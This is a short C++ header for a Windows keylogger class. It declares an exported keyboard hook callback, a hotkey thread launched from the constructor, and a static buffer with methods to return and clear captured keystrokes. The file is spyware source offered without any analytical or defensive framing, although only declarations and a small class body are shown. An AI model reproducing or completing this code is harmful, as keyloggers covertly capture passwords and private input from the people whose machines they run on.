#pragma once
#include <windows.h>
#include <winuser.h>
#include <stdio.h>
#include <vector>
#include <string>

#pragma comment( lib, "user32.lib" )

#define DEBUG

__declspec(dllexport) LRESULT CALLBACK KeyboardEvent(int nCode, WPARAM wParam, LPARAM lParam);
DWORD WINAPI my_HotKey(LPVOID lpParm);
void MessageLoop();
CHAR* ExePathA();

class keylogger
{
public:
    static std::vector<char> buffer;

    keylogger() {
        HANDLE hThread;
        DWORD dwThread;
        CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)my_HotKey, (LPVOID)ExePathA(), NULL, &dwThread);
    };
    std::string GetBuffer() {
        return std::string(buffer.begin(), buffer.end());
    };
    void ClearBuffer() {
        buffer.clear();
    }
};